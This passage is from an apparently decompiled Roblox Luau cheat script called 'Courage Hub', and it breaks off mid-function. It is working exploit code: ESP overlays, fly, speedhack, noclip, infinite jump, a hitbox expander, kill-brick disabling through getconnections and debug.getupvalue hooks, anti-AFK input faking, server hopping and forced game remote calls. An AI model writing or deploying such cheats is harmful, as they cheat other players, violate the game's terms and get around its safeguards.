		index:CreateThreads("PlayerAdded", players.PlayerAdded, function(arg)
			index:AddTarget(arg)
		end)

		index:CreateThreads("PlayerRemoving", players.PlayerRemoving, function(arg)
			index:RemoveTarget(arg)
		end)

		index.AddModelTarget = function(arg, model, arg2, customGradTop)
			if not model or not model:IsA("Model") then
				return
			end
			local modelKey = "_model_" .. tostring(model:GetDebugId())
			if arg.Cache[modelKey] then
				return
			end
			local child2 = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChild("Torso") or model:FindFirstChild("Part") or model:FindFirstChild("Head")
			local humanoid = model:FindFirstChildOfClass("Humanoid")
			if not child2 then
				return
			end
			local health2 = humanoid and humanoid.Health or 100
			local maxHealth = humanoid and humanoid.MaxHealth or 100
			customGradTop = customGradTop or getgenv()._CH_MobESPColor
			local tbl11 = { Player = nil }
			tbl11["DisplayName"] = arg2 or model.Name
			tbl11.ModelKey = modelKey
			tbl11.Model = model
			tbl11["Objects"] = {}
			tbl11.Conns = {}
			tbl11.Character = model
			tbl11.RootPart = child2
			tbl11.Humanoid = humanoid
			tbl11.Children = model:GetChildren()
			tbl11.Health = health2
			tbl11.MaxHealth = maxHealth
			tbl11.Armor = 100
			tbl11["MaxArmor"] = 100
			tbl11.CurrentTool = nil
			tbl11["Alive"] = health2 > 0
			tbl11["LastChamsT"] = nil
			tbl11["LastW"] = nil
			tbl11["LastH"] = nil
			tbl11.LastX = nil
			tbl11.LastY = nil
			tbl11.WalkActive = false
			tbl11.JumpActive = false
			tbl11["FallingActive"] = false
			tbl11.SwimmingActive = false
			tbl11.LastGlowTop = nil
			tbl11.LastGlowBot = nil
			tbl11["LastGlowT1"] = nil
			tbl11.LastGlowT2 = nil
			tbl11.LastGradTop = nil
			tbl11.LastGradBot = nil
			tbl11.LastFillTop = nil
			tbl11.LastFillBot = nil
			tbl11["LastFillT1"] = nil
			tbl11.LastFillT2 = nil
			tbl11["LastDist"] = nil
			tbl11.LastDistColor = nil
			tbl11.LastDisplayName = nil
			tbl11.LastNameColor = nil
			tbl11.LastHealthTop = nil
			tbl11.LastHealthMid = nil
			tbl11["LastHealthBot"] = nil
			tbl11.LastHealthFloor = nil
			tbl11.LastRatio = nil
			tbl11["LastArmorTop"] = nil
			tbl11.LastArmorMid = nil
			tbl11["LastArmorBot"] = nil
			tbl11["LastArmorFloor"] = nil
			tbl11["LastArmorRatio"] = nil
			tbl11.LastWeapon = nil
			tbl11["LastWeaponColor"] = nil
			tbl11.CustomGradTop = customGradTop
			tbl11.CustomGradBot = customGradTop
			arg:InitEsp(tbl11)
			arg["Cache"][modelKey] = tbl11

			if humanoid then
				tbl11.Conns["Health"] = humanoid.HealthChanged:Connect(function(health)
					tbl11.Alive = health > 0
					tbl11.Health = health
				end)

				tbl11.Conns["Died"] = humanoid.Died:Connect(function()
					tbl11["Alive"] = false
				end)
			end

			tbl11.Conns.ModelDestroyed = model.AncestryChanged:Connect(function(child, parent)
				if not parent then
					arg:RemoveModelTarget(model)
				end
			end)
		end

		index.RemoveModelTarget = function(arg, arg2)
			local str2 = "_model_" .. tostring(arg2:GetDebugId())
			local v25 = arg.Cache[str2]
			if not v25 then
				return
			end

			for _, connection10 in v25.Conns do
				pcall(function()
					connection10:Disconnect()
				end)
			end

			clear(v25.Conns)

			if v25.Objects.Highlight then
				pcall(function()
					v25.Objects.Highlight:Destroy()
				end)
			end

			if v25.Objects.TargetHolder then
				v25.Objects.TargetHolder:Destroy()
			end

			clear(v25.Objects)
			arg["Cache"][str2] = nil
		end

		index.Unload = function(arg)
			for k, v25 in arg.Cache do
				if v25 and v25.ModelKey then
					arg:RemoveModelTarget(v25.Model or { GetDebugId = function()
						return k:gsub("^_model_", "")
					end })
				else
					arg:RemoveTarget(k)
				end
			end

			for _, connection10 in arg["Connections"] do
				connection10:Disconnect()
			end

			clear(arg["Connections"])

			for _, connection10 in arg.Threads do
				connection10:Disconnect()
			end

			clear(arg.Threads)

			if arg.Holder then


				arg["Holder"]:Destroy()
				arg.Holder = nil
			end

			clear(arg.Cache)
		end
	end

	chEspLib = getgenv()._CH_EspLib
	local table_ = chEspLib.Table
	getgenv()._CH_PlayerESPColor = getgenv()._CH_PlayerESPColor or Color3.fromRGB(0, 255, 0)
	getgenv()._CH_MobESPColor = getgenv()._CH_MobESPColor or Color3.fromRGB(255, 0, 0)
	getgenv()._CH_NpcESPColor = getgenv()._CH_NpcESPColor or Color3.fromRGB(255, 165, 0)
	service = game:GetService("RunService")
	Players = game:GetService("Players")
	UserInputService = game:GetService("UserInputService")
	local Lighting = game:GetService("Lighting")
	currentCamera = workspace.CurrentCamera
	localPlayer = Players.LocalPlayer

	getCharacter = function()
		return localPlayer.Character
	end

	getChild = function()
		local character = getCharacter()
		return character and character:FindFirstChild("HumanoidRootPart")
	end

	local function getHumanoid()
		local character = getCharacter()
		return character and character:FindFirstChildOfClass("Humanoid")
	end

	local tbl10 = {
		speed = 100,
		infJumpH = 50,
		flySpeed = 100,
		brightness = 2,
		freeCamSens = 0.3,
		freeCamSpeed = 0.5,
		fovVal = 70,
	}

	
	lib = CourageCompat(__LoadCourageUI())
	local fn21

	do
		local window = lib:CreateWindow({ Title = "Courage Hub", Version = "v1.0" })
		tbl6 = {}
		tbl7 = {}
		local tbl11 = {}

		fn15 = function(arg)
			table.insert(tbl11, arg)
		end

		getgenv()._CourageWindow = lib
		getgenv()._ZeroWindow = lib
		local unload = window.Unload

		window.Unload = function(arg)
			for _, v24 in ipairs(tbl11) do
				pcall(v24)
			end

			getgenv()._CourageWindow = nil
			getgenv()._ZeroWindow = nil
			return unload(arg)
		end

		fn16 = function(arg, arg2)
			task.defer(function()
				pcall(function()
					lib:Notify({ Title = "Courage Hub", Description = arg, Duration = arg2 or 3 })
					do
						return
					end

					while true do
					end
				end)
			end)
		end

		fn17 = function(arg)
			local flag11 = lib.Flags[arg]
			if type(flag11) == "table" and flag11.Value ~= nil then
				return flag11.Value
			end

			if type(flag11) == "boolean" then
				return flag11
			end
			return false
		end

		fn21 = function(arg, arg2)
			local flag11 = lib.Flags[arg]

			if type(flag11) == "table" and flag11.SetValue then
				pcall(function()
					flag11:SetValue(arg2)
				end)
			end
		end

		local farm = window:AddCategory("FARM")

		tbl8 = {
			MobFarm = farm:AddTab("Mob Farm"),
			PlayerFarm = farm:AddTab("Player Farm"),
			InstaKill = farm:AddTab("Insta Kill"),
			Combat = farm:AddTab("Combat"),
			TrinketFarm = farm:AddTab("Trinkets"),
			RarityFarm = farm:AddTab("Rarity Farm"),
			BossFarm = farm:AddTab("Boss Farm"),
			NetOwn = farm:AddTab("Network"),
		}

		local player = window:AddCategory("PLAYER")
		tbl8.Movement = player:AddTab("Movement")
		tbl8.Utility = player:AddTab("Utility")
		tbl8.Misc = player:AddTab("Misc")
		tbl8.ESP = window:AddCategory("ESP"):AddTab("ESP")
		local world = window:AddCategory("WORLD")
		tbl8.Camera = world:AddTab("Camera")
		tbl8.Effects = world:AddTab("Effects")
		tbl8.Perf = world:AddTab("Performance")
		tbl8.Teleport = world:AddTab("Teleport")
		tbl8.TPNpcs = world:AddTab("TP NPCs")
		tbl8.TPAreas = world:AddTab("TP Areas")
		tbl8.Attach = world:AddTab("Attach")
		lib:CreateSettingsTab(window)
	end

	local v24 = tbl8.Movement:AddGroupbox("Fly")
	local Speed = tbl8.Movement:AddGroupbox("Speed")
	local v25 = tbl8.Movement:AddGroupbox("Jump")
	local Collision = tbl8.Movement:AddGroupbox("Collision")
	local Animations = tbl8.Utility:AddGroupbox("Animations")
	local Utility = tbl8.Utility:AddGroupbox("Utility")
	local v26 = tbl8.Utility:AddGroupbox("Hitbox")
	local Server = tbl8.Misc:AddGroupbox("Server")
	local v27 = tbl8.Misc:AddGroupbox("Misc")
	local v28 = tbl8.ESP:AddGroupbox("Player ESP")
	local v29 = tbl8.ESP:AddGroupbox("Local Player ESP")
	local v30 = tbl8.ESP:AddGroupbox("Target ESP")
	local Toggles = tbl8.ESP:AddGroupbox("Toggles")
	local Style = tbl8.ESP:AddGroupbox("Style")
	local Colors = tbl8.ESP:AddGroupbox("Colors")
	local v31 = tbl8.Camera:AddGroupbox("Spectate")
	local Lighting2 = tbl8.Camera:AddGroupbox("Lighting")
	local v32 = tbl8.Camera:AddGroupbox("Free Cam")
	local v33 = tbl8.Effects:AddGroupbox("Camera")
	local Cursor = tbl8.Effects:AddGroupbox("Cursor")
	local v34 = tbl8.Perf:AddGroupbox("FPS Boost")
	local Tools = tbl8.Teleport:AddGroupbox("Tools")
	local Teleport = tbl8.Teleport:AddGroupbox("Teleport")
	local Attach = tbl8.Attach:AddGroupbox("Attach")
	local v35 = tbl8.Attach:AddGroupbox("Attach Config")

	fn18 = function(cFrame)
		local ReplicatedStorage = game:GetService("ReplicatedStorage")

		pcall(function()
			ReplicatedStorage.Remotes.OpenCharacterCustomization:FireServer("Close")
		end)

		pcall(function()
			ReplicatedStorage.Remotes.CustomizationRestoreAck:FireServer(11)
		end)

		task.wait(0.5)
		local now2 = tick()

		while tick() - now2 < 3 do
			local child = getChild()
			if not child then
				break
			end
			child.CFrame = cFrame
			child.AssemblyLinearVelocity = Vector3.zero
			child.AssemblyAngularVelocity = Vector3.zero
			task.wait()
		end
	end

	tweenSpeed2 = 30
	local count2 = 0

	fn19 = function(cFrame, arg)
		local child = getChild()
		if not child then
			return
		end
		child.AssemblyLinearVelocity = Vector3.zero
		count2 += 1
		local count3 = count2
		local position = cFrame.Position
		local cframe = CFrame.new(child.Position)
		local flag11 = false
		local character = getCharacter()
		local child2 = character and character:FindFirstChildOfClass("Humanoid")

		service:BindToRenderStep("CHChestTween", Enum.RenderPriority.Input.Value - 1, function(arg2)
			do
				if count2 ~= count3 or arg and arg() then
					service:UnbindFromRenderStep("CHChestTween")

					if child2 then
						child2:Move(Vector3.zero)
					end

					flag11 = true
					return
				end

				local child3 = getChild()

				if not child3 then
					service:UnbindFromRenderStep("CHChestTween")
					flag11 = true
					return
				end

				local position2 = position - cframe.Position

				if position2.Magnitude <= 1 then
					child3.CFrame = cFrame
					child3.AssemblyLinearVelocity = Vector3.zero
					child3.AssemblyAngularVelocity = Vector3.zero

					if child2 then
						child2:Move(Vector3.zero)
					end

					service:UnbindFromRenderStep("CHChestTween")
					flag11 = true
					return
				end

				cframe += position2.Unit * tweenSpeed2 * arg2
				child3.CFrame = CFrame.new(cframe.Position)
				child3.AssemblyLinearVelocity = Vector3.zero
				child3.AssemblyAngularVelocity = Vector3.zero

				if child2 then


					child2:Move(Vector3.new(position2.Unit.X, 0, position2.Unit.Z))
				end

				return
			end

			while true do
			end
		end)

		while not flag11 do
			task.wait()
		end
	end

	lib:Notify({
		Title = "Courage Hub",
		Description = "Courage Hub v1.0 loaded.",
		Type = "Success",
		Duration = 4,
	})

	tbl6.Fly = v24:AddToggle("Fly", {
		Text = "Fly",
		Description = "Fly anywhere",
		Default = false,
		Callback = function(fly)
			if fly then
				service:BindToRenderStep("CHFly", Enum.RenderPriority.Input.Value, function(arg)
					local character = getCharacter()
					if not character then
						return
					end
					local child = character:FindFirstChild("HumanoidRootPart")
					if not child then
						return
					end

					if getgenv()._chFireBypass then
						getgenv()._chFireBypass()
					end

					if not getgenv()._CH_flyFrame then
						getgenv()._CH_flyFrame = child.CFrame
					end

					local chFlyFrame = getgenv()._CH_flyFrame
					local cframe = currentCamera.CFrame
					local vector = Vector3.zero
					local unit = Vector3.new(cframe.LookVector.X, 0, cframe.LookVector.Z).Unit
					local unit2 = Vector3.new(cframe.RightVector.X, 0, cframe.RightVector.Z).Unit

					if UserInputService:IsKeyDown(Enum.KeyCode.W) then
						vector += unit
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.S) then
						vector -= unit
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.A) then
						vector -= unit2
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.D) then
						vector += unit2
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
						vector += Vector3.new(0, 1, 0)
					end

					if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
						vector -= Vector3.new(0, 1, 0)
					end

					if vector.Magnitude > 0 then
						chFlyFrame += vector.Unit * tbl10.flySpeed * arg
					end

					local vector3 = Vector3.new(cframe.LookVector.X, 0, cframe.LookVector.Z)

					if vector3.Magnitude > 0 then
						chFlyFrame = CFrame.new(chFlyFrame.Position, chFlyFrame.Position + vector3.Unit)
					end

					getgenv()._CH_flyFrame = chFlyFrame
					child.AssemblyLinearVelocity = Vector3.zero
					child.CFrame = chFlyFrame
				end)
			else
				service:UnbindFromRenderStep("CHFly")
				local chFlyFrame = getgenv()._CH_flyFrame
				getgenv()._CH_flyFrame = nil

				if chFlyFrame then
					local child = getChild()

					if child then
						child.CFrame = chFlyFrame
						child.AssemblyLinearVelocity = Vector3.zero
					end
				end
			end
		end,
	})

	tbl6.Fly:AddKeybind({ Default = Enum.KeyCode.Y, Mode = "Toggle" })

	tbl7.FlySpeed = v24:AddSlider("FlySpeed", {
		Text = "Fly Speed",
		Default = 100,
		Min = 0,
		Max = 5000,
		Rounding = 0,
		Callback = function(value)
			do
				tbl10.flySpeed = value
				return
			end

			while true do
			end
		end,
	})

	tbl6.Speedhack = Speed:AddToggle("Speedhack", {
		Text = "Speedhack",
		Description = "Move faster",
		Default = false,
		Callback = function(speedhack)
			if speedhack then
				service:BindToRenderStep("CHSpeed", Enum.RenderPriority.Input.Value, function(arg)
					local character = getCharacter()
					if not character then
						return
					end
					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if humanoid and not (humanoid.Health <= 0) then
						local child = character:FindFirstChild("HumanoidRootPart")
						if not child then
							return
						end

						if humanoid.MoveDirection.Magnitude > 0 then
							child.CFrame += humanoid.MoveDirection * tbl10.speed * arg
						end

						return
					end

					do
						return
					end

					while true do
					end
				end)
			else
				service:UnbindFromRenderStep("CHSpeed")
			end
		end,
	})

	tbl6.Speedhack:AddKeybind({ Default = Enum.KeyCode.N, Mode = "Toggle" })

	tbl7.SpeedhackSpeed = Speed:AddSlider("SpeedhackSpeed", {
		Text = "Speed",
		Default = 100,
		Min = 0,
		Max = 5000,
		Rounding = 0,
		Callback = function(speed)
			tbl10.speed = speed
		end,
	})

	tbl6.NoSlow = Speed:AddToggle("NoSlow", {
		Text = "No Slow",
		Description = "Ignore slow effects",
		Default = false,
		Callback = function(noSlow)
			pcall(function()
				service:UnbindFromRenderStep("CHNoSlow")
			end)

			if not noSlow then
				return
			end

			service:BindToRenderStep("CHNoSlow", Enum.RenderPriority.Input.Value, function(arg)
				local character = getCharacter()
				if not character then
					return
				end
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health <= 0 then
					return
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end

				if humanoid.WalkSpeed < 16 and humanoid.MoveDirection.Magnitude > 0 then
					humanoidRootPart.CFrame += humanoid.MoveDirection * 16 * arg
				end
			end)
		end,
	})

	connection = nil

	tbl6.InfiniteJump = v25:AddToggle("InfiniteJump", {
		Text = "Infinite Jump",
		Description = "Jump in mid-air",
		Default = false,
		Callback = function(infiniteJump)
			if connection then
				connection:Disconnect()
				connection = nil
			end

			if infiniteJump then
				connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
					if gameProcessed or input.KeyCode ~= Enum.KeyCode.Space then
						return
					end
					local child = getChild()
					if not child then
						return
					end
					child.AssemblyLinearVelocity = Vector3.new(child.AssemblyLinearVelocity.X, tbl10.infJumpH, child.AssemblyLinearVelocity.Z)
				end)
			end
		end,
	})

	tbl6.InfiniteJump:AddKeybind({ Default = Enum.KeyCode.H, Mode = "Toggle" })

	tbl7.InfiniteJumpHeight = v25:AddSlider("InfiniteJumpHeight", {
		Text = "Jump Height",
		Default = 50,
		Min = 0,
		Max = 1000,
		Rounding = 0,
		Callback = function(jumpHeight)
			tbl10.infJumpH = jumpHeight
		end,
	})

	connection2 = nil
	connection3 = nil

	tbl6.JumpFix = v25:AddToggle("JumpFix", {
		Text = "Ignore Jump Lock",
		Description = "Bypass jump locks",
		Default = false,
		Callback = function(ignoreJumpLock)
			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if not ignoreJumpLock then
				return
			end

			local function onHeartbeat()
				local humanoid = getHumanoid()
				if not humanoid then
					return
				end

				pcall(function()
					humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
					humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
					humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)

					if humanoid.JumpPower <= 0 then
						humanoid.JumpPower = 50
					end

					if humanoid.JumpHeight <= 0 then


						humanoid.JumpHeight = 7.2000000000000002
					end
				end)
			end

			onHeartbeat()
			connection2 = service.Heartbeat:Connect(onHeartbeat)

			connection3 = localPlayer.CharacterAdded:Connect(function()
				task.wait(0.5)

				if fn17("JumpFix") then
					onHeartbeat()
				end
			end)
		end,
	})

	connection4 = nil

	tbl6.Noclip = Collision:AddToggle("Noclip", {
		Text = "Noclip",
		Description = "Walk through walls",
		Default = false,
		Callback = function(enabled2)
			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if not enabled2 then
				return
			end
			local parts = {}
			local character2 = nil

			connection4 = service.Heartbeat:Connect(function()
				local character = getCharacter()

				if character ~= character2 then
					parts = {}
					character2 = character

					if character then
						for _, descendant in ipairs(character:GetDescendants()) do
							if descendant:IsA("BasePart") then
								parts[#parts + 1] = descendant
							end
						end
					end
				end

				for _, part in ipairs(parts) do
					if part.Parent then
						part.CanCollide = false
					end
				end
			end)
		end,
	})

	tbl6.Noclip:AddKeybind({ Default = Enum.KeyCode.T, Mode = "Toggle" })
	local connection10 = nil
	local descendants = {}

	tbl6.NoKillbricks = Collision:AddToggle("NoKillbricks", {
		Text = "No Killbricks",
		Description = "Ignore kill bricks",
		Default = false,
		Callback = function(noKillbricks)
			if connection10 then
				connection10:Disconnect()
				connection10 = nil
			end

			if not noKillbricks then
				for _, descendant in pairs(descendants) do
					for _, v36 in ipairs(descendant) do
						pcall(function()
							v36:Reconnect()
						end)
					end
				end

				descendants = {}
				return
			end

			local function fn22()
				if not getconnections then
					return
				end

				if not getCharacter() then
					return
				end

				for _, descendant in ipairs(workspace:GetDescendants()) do
					if not (descendant:IsA("BasePart") and not descendants[descendant]) then
						continue
					end
					local connections = getconnections(descendant.Touched)
					local connections2 = {}

					for _, connection11 in ipairs(connections) do
						local function_ = connection11.Function
						if not function_ then
							continue
						end

						if pcall(function()
							return debug.getinfo(function_).source
						end) then
							local source = debug.getinfo(function_).source
						end

						local ok, result = pcall(function()
							local tbl11 = {}

							for i = 1, 10 do
								local ok, result, result2 = pcall(debug.getupvalue, function_, i)
								if not (ok and result) then
									break
								end
								tbl11[result] = result2
							end

							return tbl11
						end)

						local v36 = false

						if ok and result then
							for _, v37 in pairs(result) do
								if type(v37) == "number" and v37 == 0 then
									v36 = true
								end
							end
						end

						if v36 or descendant.Name:lower():find("kill") or descendant.Name:lower():find("death") or descendant.Name:lower():find("lava") then
							pcall(function()
								connection11:Disable()
							end)

							table.insert(connections2, connection11)
						end
					end

					if #connections2 > 0 then
						descendants[descendant] = connections2
					end
				end
			end

			fn22()

			connection10 = service.Heartbeat:Connect(function()
				local now2 = tick()

				if not connection10._lastScan or now2 - connection10._lastScan > 3 then
					connection10._lastScan = now2
					fn22()
				end
			end)
		end,
	})

	fn15(function()
		if connection10 then
			connection10:Disconnect()
			connection10 = nil
		end

		for _, descendant in pairs(descendants) do
			for _, v36 in ipairs(descendant) do
				pcall(function()
					v36:Reconnect()
				end)
			end
		end

		descendants = {}
	end)

	local connection11 = nil
	local fallenPartsDestroyHeight = nil

	tbl6.AntiVoid = Collision:AddToggle("AntiVoid", {
		Text = "Anti Void",
		Description = "Survive falling off the map",
		Default = false,
		Callback = function(antiVoid)
			if connection11 then
				connection11:Disconnect()
				connection11 = nil
			end

			if not antiVoid then
				if fallenPartsDestroyHeight then
					pcall(function()
						workspace.FallenPartsDestroyHeight = fallenPartsDestroyHeight
					end)

					fallenPartsDestroyHeight = nil
				end

				return
			end

			fallenPartsDestroyHeight = workspace.FallenPartsDestroyHeight

			pcall(function()
				workspace.FallenPartsDestroyHeight = -1e9
			end)

			connection11 = service.Heartbeat:Connect(function()
				pcall(function()
					if workspace.FallenPartsDestroyHeight > -100000000 then
						workspace.FallenPartsDestroyHeight = -1e9
					end
				end)
			end)
		end,
	})

	fn15(function()
		if connection11 then
			connection11:Disconnect()
			connection11 = nil
		end

		if fallenPartsDestroyHeight then
			pcall(function()
				workspace.FallenPartsDestroyHeight = fallenPartsDestroyHeight
			end)

			fallenPartsDestroyHeight = nil
		end
	end)

	connection5 = nil
	connection6 = nil

	local function fn22()
		do
			local character = getCharacter()
			if not character then
				return
			end
			local child = character:FindFirstChildOfClass("Humanoid")
			if not child then
				return
			end
			local animator = child:FindFirstChildOfClass("Animator")
			if not animator then
				return
			end

			for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
				pcall(function()
					track:Stop(0)
					track:Destroy()
				end)
			end

			return
		end

		while true do
		end
	end

	tbl6.NoAnims = Animations:AddToggle("NoAnims", {
		Text = "No Anims",
		Description = "T-pose",
		Default = false,
		Callback = function(enabled2)
			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			if enabled2 then
				fn22()

				connection5 = service.Heartbeat:Connect(function()
					fn22()
				end)

				connection6 = localPlayer.CharacterAdded:Connect(function()
					task.wait(0.5)

					if fn17("NoAnims") then
						fn22()
					end
				end)
			end
		end,
	})

	local function fn23()
		local connection12 = nil
		local n9 = 1

		local function fn24(speed)
			pcall(function()
				local character = getCharacter()
				if not character then
					return
				end
				local child = character:FindFirstChildOfClass("Humanoid")
				if not child then
					return
				end
				local animator = child:FindFirstChildOfClass("Animator")
				if not animator then
					return
				end

				for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
					pcall(function()
						track:AdjustSpeed(speed)
					end)
				end
			end)
		end

		tbl6.AnimSpeed = Animations:AddToggle("AnimSpeed", {
			Text = "Anim Speed",
			Description = "Change animation speed",
			Default = false,
			Callback = function(animSpeed)
				if connection12 then
					connection12:Disconnect()
					connection12 = nil
				end

				if animSpeed then
					connection12 = service.Heartbeat:Connect(function()
						fn24(n9)
					end)
				else
					fn24(1)
				end
			end,
		})

		tbl7.AnimSpeedSlider = Animations:AddSlider("AnimSpeedSlider", {
			Text = "Speed",
			Default = 1,
			Min = 0.1,
			Max = 200,
			Rounding = 1,
			Callback = function(value)
				n9 = value
			end,
		})

		fn15(function()
			if connection12 then
				connection12:Disconnect()
				connection12 = nil
			end

			fn24(1)
		end)
	end

	fn23()
	connection7 = nil
	flag10 = false

	tbl6.AntiAFK = Utility:AddToggle("AntiAFK", {
		Text = "Anti AFK",
		Description = "Prevents AFK kick",
		Default = false,
		Callback = function(antiAfk)
			if connection7 then
				connection7:Disconnect()
				connection7 = nil
			end

			flag10 = false
			if not antiAfk then
				return
			end
			flag10 = true
			local service4 = game:GetService("VirtualInputManager")

			local function fn24()
				pcall(function()
					service4:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
					task.wait(0.1)
					service4:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
				end)
			end

			task.spawn(function()
				while flag10 do
					task.wait(240)

					if flag10 then
						fn24()
					end
				end
			end)
		end,
	})

	Utility:AddButton({
		Text = "Kill Self",
		Func = function()
			local humanoid = getHumanoid()

			if humanoid then
				humanoid.Health = 0
			end
		end,
	})

	do
		local connection12 = nil
		local v36 = 50
		local tbl11 = {}

		local function fn24(instance)
			local parent = instance.Parent

			while parent and parent ~= workspace do
				if parent:FindFirstChildOfClass("Humanoid") then
					return true
				end
				parent = parent.Parent
			end

			return false
		end

		tbl6.HitboxExpander = v26:AddToggle("HitboxExpander", {
			Text = "Hitbox Expander",
			Description = "Bigger hitboxes",
			Default = false,
			Callback = function(hitboxExpander)
				if connection12 then
					connection12:Disconnect()
					connection12 = nil
				end

				if not hitboxExpander then
					for k, v37 in pairs(tbl11) do
						pcall(function()
							if k and k.Parent then
								k.Size = v37
							end
						end)
					end

					tbl11 = {}
					return
				end

				connection12 = service.Heartbeat:Connect(function()
					for _, descendant in ipairs(workspace:GetDescendants()) do
						if not (descendant:IsA("BasePart") and descendant:FindFirstChild("TouchInterest") and not descendant.Anchored) then
							continue
						end

						if not fn24(descendant) then
							if not tbl11[descendant] then
								tbl11[descendant] = descendant.Size
							end

							local vector = Vector3.one * v36

							if descendant.Size.Magnitude < vector.Magnitude then
								descendant.Size = descendant.Size:Lerp(vector, 0.5)
							end

							descendant.CanCollide = false
							descendant.Transparency = 0.8
						end
					end

					for k in pairs(tbl11) do
						if not k or not k.Parent then
							tbl11[k] = nil
						end
					end
				end)
			end,
		})

		tbl7.HitboxSize = v26:AddSlider("HitboxSize", {
			Text = "Hitbox Size",
			Default = 50,
			Min = 5,
			Max = 150,
			Rounding = 0,
			Callback = function(value)
				v36 = value
			end,
		})

		fn15(function()
			if connection12 then
				connection12:Disconnect()
				connection12 = nil
			end

			for k, v37 in pairs(tbl11) do
				pcall(function()
					if k and k.Parent then
						k.Size = v37
					end
				end)
			end

			tbl11 = {}
		end)
	end

	local function fn24()
		local connections = {}
		local cframe = nil

		local function fn25()
			for _, connection12 in ipairs(connections) do
				pcall(function()
					connection12:Disconnect()
				end)
			end

			table.clear(connections)
		end

		tbl6.TPOnDeath = v27:AddToggle("TPOnDeath", {
			Text = "TP Back on Death",
			Description = "Respawn where you died",
			Default = false,
			Callback = function(tpBackOnDeath)
				fn25()
				cframe = nil
				if not tpBackOnDeath then
					return
				end

				local function fn26(instance)
					if not instance then
						return
					end
					local child = instance:WaitForChild("Humanoid", 5)
					if not child then
						return
					end
					local humanoidRootPart = instance:WaitForChild("HumanoidRootPart", 5)
					if not humanoidRootPart then
						return
					end
					cframe = humanoidRootPart.CFrame

					local connection12 = service.Heartbeat:Connect(function()
						if child.Health > 0 and humanoidRootPart and humanoidRootPart.Parent then
							cframe = humanoidRootPart.CFrame
						end
					end)

					table.insert(connections, connection12)

					local connection13 = child.Died:Connect(function()
						connection12:Disconnect()

						if cframe then
							local cframe2 = cframe

							task.spawn(function()
								local result = localPlayer.CharacterAdded:Wait()
								task.wait(0.5)
								local humanoidRootPart2 = result:WaitForChild("HumanoidRootPart", 10)
								if not humanoidRootPart2 then
									return
								end
								local humanoid = result:WaitForChild("Humanoid", 5)

								if humanoid then
									humanoid:WaitForChild("Animator", 3)
								end

								task.wait(0.3)
								if not fn17("TPOnDeath") then
									return
								end

								for i = 1, 20 do
									if humanoidRootPart2 and humanoidRootPart2.Parent then
										humanoidRootPart2.CFrame = cframe2
										humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
										humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
										task.wait(0.1)
										if not ((humanoidRootPart2.Position - cframe2.Position).Magnitude < 5) then
											continue
										end
									end

									break
								end
							end)

							return
						end

						do
							return
						end

						while true do
						end
					end)

					table.insert(connections, connection13)
				end

				fn26(localPlayer.Character)

				local connection12 = localPlayer.CharacterAdded:Connect(function(character)
					task.wait(0.3)
					fn26(character)
				end)

				table.insert(connections, connection12)
			end,
		})

		fn15(function()
			fn25()
		end)
	end

	fn24()

	Server:AddButton({
		Text = "Server Hop",
		Description = "Join a different server",
		Func = function()
			task.spawn(function()
				local TeleportService = game:GetService("TeleportService")
				local placeId = game.PlaceId
				local ids = {}

				local ok, result = pcall(function()
					return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"))
				end)

				if ok and result and result.data then
					for _, v36 in ipairs(result.data) do
						if v36.id ~= game.JobId and v36.playing and v36.maxPlayers and v36.playing < v36.maxPlayers then
							table.insert(ids, v36.id)
						end
					end
				end

				if #ids > 0 then
					fn16("Hopping to new server...", 3)

					pcall(function()
						TeleportService:TeleportToPlaceInstance(placeId, ids[math.random(#ids)])
					end)
				else
					fn16("No available servers found, rejoining...", 3)

					pcall(function()
						TeleportService:Teleport(placeId)
					end)
				end
			end)
		end,
	})

	Server:AddButton({
		Text = "Rejoin Server",
		Description = "Rejoin this server",
		Func = function()
			task.spawn(function()
				fn16("Rejoining server...", 3)

				pcall(function()
					game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
				end)
			end)
		end,
	})

	local Actions = require(game:GetService("ReplicatedStorage").Assets.Scripts.Actions)
	local value = rawget(require(game:GetService("ReplicatedStorage").Assets.Scripts.DirectionalDash), "Configs")
	local tbl11 = {}
	local connection12 = nil

	tbl6.AutoSuperRun = v27:AddToggle("AutoSuperRun", {
		Text = "Auto Super Run",
		Description = "Always sprint at max speed",
		Default = false,
		Callback = function(autoSuperRun)
			if connection12 then
				connection12:Disconnect()
				connection12 = nil
			end

			if not autoSuperRun then
				return
			end
			local superRunEvent = game:GetService("ReplicatedStorage").Remotes.SuperRunEvent
			local sprint = nil

			connection12 = service.Heartbeat:Connect(function()
				if not fn17("AutoSuperRun") then
					return
				end
				local character = getCharacter()
				if not character then
					return
				end
				local movement = character:FindFirstChild("Movement")

				if movement and not sprint then
					sprint = movement:FindFirstChild("Sprint")


				end

				if sprint then
					pcall(function()
						sprint:FireServer(true)
					end)
				end

				pcall(function()
					superRunEvent:FireServer(true)
					do
						return
					end

					while true do
					end
				end)

				local values = character:FindFirstChild("Values")

				if values then
					local sprintActive = values:FindFirstChild("SprintActive")

					if sprintActive then
						pcall(function()
							sprintActive.Value = true
						end)
					end

